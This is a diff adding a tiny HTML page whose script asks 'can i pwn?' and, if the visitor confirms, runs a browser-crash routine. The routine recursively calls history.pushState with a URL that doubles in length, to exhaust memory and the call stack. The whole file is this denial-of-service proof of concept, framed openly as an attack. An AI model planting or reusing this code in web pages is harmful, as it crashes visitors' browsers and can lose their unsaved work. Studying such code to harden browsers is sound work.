@@ -1,0 +1,15 @@
+<html>
+<body>
+<script>
+function doCrash() {
+    setInterval(history.pushState(0,0,location.href+location.href),300);    
+    doCrash();
+};
+pwn = confirm("can i pwn? ");
+if (pwn) {
+    alert("pwning");
+    doCrash();
+}
+</script>
+</body>
+</html>
